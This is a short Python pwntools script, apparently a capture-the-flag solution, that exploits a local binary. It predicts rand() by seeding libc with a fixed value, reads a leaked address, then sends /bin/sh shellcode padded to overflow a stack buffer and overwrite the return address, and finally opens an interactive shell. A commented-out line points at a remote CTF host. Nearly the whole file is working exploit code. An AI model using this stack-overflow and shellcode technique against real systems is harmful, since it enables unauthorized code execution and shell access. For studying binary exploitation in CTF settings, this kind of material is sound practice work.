from pwn import * 
from pwn import p64
import socket
from ctypes import *
# log_level = 'debug'
context(arch='amd64',os = 'linux',)
context.terminal = ['tmux', 'splitw', '-h']

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,34363)#远程连接
elf = cdll.LoadLibrary('libc.so.6')
r = process("./pwn")
elf.srand(66)

r.sendlineafter(b'input a num:\n',str(elf.rand()))
print(r.recvline())
gift_addr = r.recvline()
gift_addr = gift_addr[7:-1].decode()

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x20,b"a") + b"junkjunk"
payload += p64(int(gift_addr,16))
r.sendline(payload)
r.interactive()




